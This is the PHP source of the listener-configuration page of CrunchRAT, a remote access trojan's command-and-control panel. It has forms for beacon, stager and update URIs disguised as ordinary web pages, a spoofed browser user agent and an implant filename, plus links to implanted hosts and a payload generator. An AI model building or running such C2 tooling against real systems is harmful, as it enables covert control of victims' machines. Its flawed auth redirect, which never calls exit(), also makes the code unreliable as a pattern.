<?php
    # Necessary at the top of every page for session management
    session_start();

    include "connector.php";

    # If unauthenticated
    if (!isset($_SESSION["authenticated"])) {
        header("Location: 403.php");
    }
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <title>CrunchRAT</title>
        <link rel="icon" href="favicon.ico" type="image/x-icon">
        <!-- CSS -->
        <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&amp;subset=latin,cyrillic-ext" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" type="text/css">
        <link href="plugins/bootstrap/css/bootstrap.css" rel="stylesheet">
        <link href="plugins/node-waves/waves.css" rel="stylesheet" />
        <link href="plugins/animate-css/animate.css" rel="stylesheet" />
        <link href="plugins/morrisjs/morris.css" rel="stylesheet" />
        <link href="css/style.css" rel="stylesheet">
        <link href="css/themes/all-themes.css" rel="stylesheet" />
        <!-- Bootstrap select CSS (page-specific) -->
        <link href="plugins/bootstrap-select/css/bootstrap-select.css" rel="stylesheet" />
    </head>

    <body class="theme-red">
        <!-- Start of navigation bar (top) -->
        <nav class="navbar">
            <div class="container-fluid">
                <div class="navbar-header">
                    <a href="" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false"></a>
                    <a href="" class="bars"></a>
                    <a class="navbar-brand" href="index.php">CrunchRAT</a>
                </div>
            </div>
        </nav><!-- End of navigation bar (top) -->

        <!-- Start of navigation bar (left) -->
        <section>
            <aside id="leftsidebar" class="sidebar">
            <!-- Start of user information -->
            <div class="user-info">
                <div class="image">
                    <img src="images/Bebop.png" width="48" height="48" alt="User" />
                </div>
                <div class="info-container">
                    <div class="name" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><?php echo htmlentities($_SESSION["username"]); ?></div>
                    <div class="btn-group user-helper-dropdown">
                        <i class="material-icons" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">keyboard_arrow_down</i>
                        <ul class="dropdown-menu pull-right">
                            <li><a href="">Change Password</a></li>
                            <li role="seperator" class="divider"></li>
                            <li><a href="logout.php"><i class="material-icons">input</i>Sign Out</a></li>
                        </ul>
                    </div>
                </div>
            </div><!-- End of user information -->

            <!-- Start of left menu links -->
            <div class="menu">
                <ul class="list">
                    <!-- Home -->
                    <li>
                        <a href="index.php">
                            <i class="material-icons">home</i>
                            <span>Home</span>
                        </a>
                    </li>
                    <!-- Implanted Systems -->
                    <li>
                        <a href="javascript:void(0);" class="menu-toggle">
                            <i class="material-icons">computer</i>
                            <span>Implanted Systems</span>
                        </a>
                        <ul class="ml-menu">
                            <li><a href="viewImplants.php">View All</a></li>
                            <?php
                                # Dynamically generates "Implanted Systems" links
                                $statement = $database_connection->prepare("SELECT `hostname`, `process_id` FROM `implants`");
                                $statement->execute();
                                $results = $statement->fetchAll();

                                foreach ($results as $row) {
                                    $url = "interact.php?h=" . urlencode($row["hostname"]) . "&pid=" . $row["process_id"];
                                    echo "<li><a href='" . $url . "'>" . htmlentities($row["hostname"]) . " (" . htmlentities($row["process_id"]) . ") " . "</a></li>";
                                }

                                $statement->connection = null;
                            ?>
                        </ul>
                    </li>
                    <!-- Payload Generator -->
                    <li>
                        <a href="javascript:void(0);" class="menu-toggle">
                            <i class="material-icons">publish</i>
                            <span>Payload Generator</span>
                        </a>
                        <ul class="ml-menu">
                            <li>
                                <a href="">Python (Native)</a>
                            </li>
                            <li>
                                <a href="">Macro</a>
                            </li>
                        </ul>
                    </li>
                    <!-- Listeners -->
                    <li class="active">
                        <a href="listeners.php">
                            <i class="material-icons">phone</i>
                            <span>Listeners</span>
                        </a>
                    </li>
                </ul>
            </div><!-- End of left menu links -->
            </aside>
        </section><!-- End of navigation bar (left) -->

        <!-- Start of main content -->
        <section class="content">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                        <div class="card">
                            <div class="header">
                                <h2>LISTENERS</h2>
                            </div>

                            <div class="body">
                                <!-- Tab headings -->
                                <ul class="nav nav-tabs tab-nav-right" role="tablist">
                                    <li role="presentation" class="active"><a href="#configure" data-toggle="tab">CONFIGURE</a></li>
                                    <li role="presentation"><a href="#view" data-toggle="tab">VIEW</a></li>
                                </ul>
                                <!-- Tab content -->
                                <div class="tab-content">
                                    <!-- "CONFIGURE" tab -->
                                    <div role="tabpanel" class="tab-pane fade in active" id="configure">
                                        <!-- Start of listener configuration form -->
                                        <form action="createListener.php" method="POST">
                                            <!-- Start of row -->
                                            <div class="row clearfix">
                                                <!-- IP Address field -->
                                                <div class="col-sm-3">
                                                    <div class="input-group">
                                                        <strong>IP Address</strong>
                                                        <input type="text" class="form-control" name="address" placeholder="Ex: 54.123.213.123">
                                                    </div>
                                                </div>
                                                <!-- Port field -->
                                                <div class="col-sm-3">
                                                    <div class="input-group">
                                                        <strong>Port</strong>
                                                        <input type="text" class="form-control" name="port" placeholder="Ex: 8080" />
                                                    </div>
                                                </div>
                                                <!-- Protocol field -->
                                                <div class="col-md-3">
                                                    <div class="input-group">
                                                        <strong>Protocol</strong>
                                                        <input type="text" class="form-control" name="protocol" placeholder="Ex: http https" />
                                                    </div>
                                                </div>
                                            </div><!-- End of row -->
                                            <!-- Start of row -->
                                            <div class="row clearfix">
                                                <!-- Beacon URI field -->
                                                <div class="col-sm-3">
                                                    <div class="input-group">
                                                        <strong>Beacon URI</strong>
                                                        <input type="text" class="form-control" name="beaconuri" placeholder="Ex: home.aspx" />
                                                    </div>
                                                </div>
                                                <!-- Update URI field -->
                                                <div class="col-sm-3">
                                                    <div class="input-group">
                                                        <strong>Update URI</strong>
                                                        <input type="text" class="form-control" name="updateuri" placeholder="Ex: index.jsp" />
                                                    </div>
                                                </div>
                                                <!-- Stager URI field -->
                                                <div class="col-sm-6">
                                                    <div class="input-group">
                                                        <strong>Stager URI</strong>
                                                        <input type="text" class="form-control" name="stageruri" placeholder="Ex: default.aspx" />
                                                    </div>
                                                </div>
                                            </div><!-- End of row -->
                                            <!-- Start of row -->
                                            <div class="row clearfix">
                                                <!-- User Agent field -->
                                                <div class="col-sm-3">
                                                    <div class="input-group">
                                                        <strong>User Agent</strong>
                                                        <input type="text" class="form-control" name="useragent" placeholder="Ex: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" />
                                                    </div>
                                                </div>
                                                <!-- Sleep Interval field -->
                                                <div class="col-sm-3">
                                                    <div class="input-group">
                                                        <strong>Sleep Interval (in seconds)</strong>
                                                        <input type="text" class="form-control" name="sleepinterval" placeholder="Ex: 10" />
                                                    </div>
                                                </div>
                                                <!-- Implant Filename field -->
                                                <div class="col-sm-6">
                                                    <div class="input-group">
                                                        <strong>Implant Filename (saved in /tmp)</strong>
                                                        <input type="text" class="form-control" name="implantfilename" placeholder="Ex: log.txt" />
                                                    </div>
                                                </div>
                                            </div><!-- End of row -->
                                            <!-- Start of row -->
                                            <div class="row clearfix">
                                                <div class="col-sm-3">
                                                    <!-- "Create Listener" button -->
                                                    <button type="submit" class="btn btn-primary m-t-15 waves-effect">CREATE LISTENER</button>
                                                </div>
                                            </div>
                                        </form><!-- End of listener configuration form -->
                                    </div>
                                    <!-- "TASKS" tab -->
                                    <div role="tabpanel" class="tab-pane fade" id="view">
                                        <!-- Start of dataTable -->
                                        <div class="table-responsive">
                                            <table class="table table-bordered table-striped table-hover js-basic-example dataTable">
                                                <thead>
                                                    <tr>
                                                        <th>Listener Management</th>
                                                        <th>ID</th>
                                                        <th>External Address</th>
                                                        <th>Port</th>
                                                        <th>Protocol</th>
                                                        <th>Beacon URI</th>
                                                        <th>Update URI</th>
                                                        <th>User Agent</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <?php
                                                        # Dynamically builds the dataTable
                                                        $statement = $database_connection->prepare("SELECT `id`, `external_address`, `port`, `protocol`, `beacon_uri`, `update_uri`, `user_agent` FROM `listeners`");
                                                        $statement->execute();
                                                        $results = $statement->fetchAll();

                                                        foreach ($results as $row) {
                                                            # Builds "Delete Listener" link
                                                            $url = "deleteListener.php?id=" . $row["id"];

                                                            echo "<tr>";
                                                            echo "<td><div class='btn-group'><a class='btn bg-red waves-effect' href=" . $url . ">Delete Listener</a></div></td>";
                                                            echo "<td>" . htmlentities($row["id"]) ."</td>";
                                                            echo "<td>" . htmlentities($row["external_address"]) ."</td>";
                                                            echo "<td>" . htmlentities($row["port"]) ."</td>";
                                                            echo "<td>" . htmlentities($row["protocol"]) ."</td>";
                                                            echo "<td>" . htmlentities($row["beacon_uri"]) ."</td>";
                                                            echo "<td>" . htmlentities($row["update_uri"]) ."</td>";
                                                            echo "<td>" . htmlentities($row["user_agent"]) ."</td>";
                                                            echo "</tr>";
                                                        }

                                                        $statement->connection = null;
                                                    ?>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section><!-- End of main content -->

        <!-- JavaScript -->
        <script src="plugins/jquery/jquery.min.js"></script>
        <script src="plugins/bootstrap/js/bootstrap.js"></script>
        <script src="plugins/bootstrap-select/js/bootstrap-select.js"></script>
        <script src="plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
        <script src="plugins/node-waves/waves.js"></script>
        <script src="plugins/jquery-datatable/jquery.dataTables.js"></script>
        <script src="plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/buttons.flash.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/jszip.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/pdfmake.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/vfs_fonts.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/buttons.html5.min.js"></script>
        <script src="plugins/jquery-datatable/extensions/export/buttons.print.min.js"></script>
        <script src="js/admin.js"></script>
        <script src="js/pages/tables/jquery-datatable.js"></script>
        <script src="js/demo.js"></script>
    </body>
</html>